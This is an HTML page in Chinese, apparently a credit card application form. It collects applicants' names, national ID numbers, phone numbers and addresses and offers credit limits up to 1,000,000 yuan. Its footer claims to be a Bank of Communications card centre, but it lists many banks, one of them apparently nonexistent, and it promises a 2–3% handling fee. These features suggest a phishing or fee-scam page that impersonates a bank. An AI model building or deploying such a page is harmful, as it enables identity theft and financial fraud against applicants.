<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<title>在线申请</title>
	<link rel="stylesheet" href="css/main.css">
</head>
<body>
	<div class="container home">
		<div class="top">
			<div class="img"><img src="images/logo.jpg" alt=""></div>			
		</div>
		<div class="form">
			<form id="form_application">
                <div class="entry clear">
					<label>您的姓名:</label>
                    <input type="text" id="username" name="username" placeholder="请填写姓名">
                </div>
                <div class="entry clear">
					<label>身份证号:</label>                
                    <input type="text" id="cardid" name="cardid" placeholder="请填写身份证号码">
                </div>
                <div class="entry clear">
					<label>手机号码:</label>
                    <input type="text" id="phone" name="phone" placeholder="请填写手机号码">
                </div>
                <div class="entry clear">
					<label>收卡地址:</label>
                    <input type="text" id="address" name="address" placeholder="请填写详细地址">
                </div>
                <div class="entry clear">
					<label>发卡银行:</label>
                    <select name="bank" id="">
	                        <option value="1">中国交通银行</option>
	                        <option value="2">中国农业银行</option>
	                        <option value="3">中国银行</option>
	                        <option value="4">中国工商银行</option>
	                        <option value="5">中国建设银行</option>
	                        <option value="6">中国邮政银行</option>
	                        <option value="7">中国银行</option>
	                        <option value="8">平安银行</option>
	                        <option value="9">光大银行</option>
	                        <option value="10">浦发银行</option>
	                        <option value="11">中兴银行</option>
	                        <option value="12">华夏银行</option>
	                        <option value="13">中国兴业银行</option>
	                        <option value="14">中国招商银行</option>
	                </select>
                </div>
                <div class="entry clear">
					<label>申请金额:</label>
                    <select name="quato" id="">
                        <option value="3">3万</option>
                        <option value="5">5万</option>
                        <option value="10">10万</option>
                        <option value="15">15万</option>
                        <option value="20">20万</option>
                        <option value="25">25万</option>
                        <option value="30">30万</option>
                        <option value="35">35万</option>
                        <option value="40">40万</option>
                        <option value="45">45万</option>
                        <option value="50">50万</option>
                        <option value="100">100万</option>
                	</select>
                </div>
                <div class="entry clear">
                	<input type="checkbox" name="" id="">本人已阅读《申请合约》
                </div>
                <input type="hidden" name="c" value="">
            </form>
            <a href="#" class="btn">立即提交订单</a>


			<div class="box">
				<div class="text">
					<p>
						本人已阅读并同意《信用卡申领合约》保证所有提供申请资料真实、准确、完整、合法且有效。并同意向中国人民银行金融信用信息基础数据库报送个人信用信息。提交资料后客服会在24小时内与您联系！请保持电话畅通！办理成功后收取百分之二到百分之三的手续费。
					</p>
				</div>
			</div>
		</div>
		<footer>
			<p>版权所有 © 粤ICP备17050892号-1</p>
			<p>交通银行股份有限公司太平洋信用卡中心中山分中心</p>
		</footer>
	</div>
</body>
</html>
